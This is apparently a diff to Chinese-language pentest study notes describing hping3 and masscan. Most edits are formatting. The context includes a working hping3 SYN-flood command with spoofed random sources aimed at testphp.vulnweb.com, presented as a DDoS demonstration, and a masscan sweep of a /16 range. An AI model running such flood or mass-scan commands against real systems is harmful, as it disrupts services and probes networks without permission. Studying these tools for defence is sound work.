@@ -19,16 +19,22 @@ fping -g IP1 IP2（IP1地址开始范围，IP2地址结束范围）；
 ### 1.1.3 hping3
 
 hping3的功能：
+
 防火墙测试
+
 端口扫描
+
 Idle扫描
+
 文件传输
+
 木马功能
-拒绝服务攻击DDOS
-
-这里讲讲
 
 拒绝服务攻击DDOS
+
+
+这里讲讲拒绝服务攻击DDOS:
+
 我使用 testphp.vulnweb.com 这个网站来测试 :
 ```
 hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testphp.vulnweb.com
@@ -45,7 +51,7 @@ hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testphp.vulnweb.com
 
 ### 1.1.4 masscan
 
-扫描用：
+扫描用，比如扫描端口：
 ```
 Masscan 10.11.0.0/16 -p80
-```
+``
